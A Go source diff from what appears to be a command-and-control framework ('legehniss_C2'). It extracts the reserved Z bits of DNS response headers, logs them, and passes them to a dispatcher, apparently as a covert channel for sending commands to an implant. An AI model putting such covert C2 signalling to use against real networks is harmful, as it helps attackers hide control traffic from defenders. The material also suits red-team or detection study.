@@ -2,6 +2,7 @@ package runloop
 
 import (
 	"context"
+	"encoding/binary"
 	"github.com/faanross/legehniss_C2/internal/composition"
 	"github.com/faanross/legehniss_C2/internal/config"
 	"github.com/miekg/dns"
@@ -84,6 +85,13 @@ func extractAndDisplayDNSResponse(response []byte) {
 		return
 	}
 
+	// Extract Z flag from raw header (miekg/dns doesn't expose it)
+	var zValue uint8
+	if len(response) >= 4 {
+		flags := binary.BigEndian.Uint16(response[2:4])
+		zValue = uint8((flags >> 4) & 0x07)
+	}
+
 	// Extract and log the answers
 	if len(msg.Answer) > 0 {
 		var ips []string
@@ -94,11 +102,12 @@ func extractAndDisplayDNSResponse(response []byte) {
 			}
 		}
 		if len(ips) > 0 {
-			log.Printf("Received response: IP=%v", ips)
+			log.Printf("Received response: IP=%v, Z=%d", ips, zValue)
 		} else {
-			log.Printf("No A records found in response")
+			log.Printf("No A records found in response, Z=%d", zValue)
 		}
 	} else {
-		log.Printf("No answers in DNS response")
+		log.Printf("No answers in DNS response, Z=%d", zValue)
 	}
+	zValueDispatcher(zValue)
 }
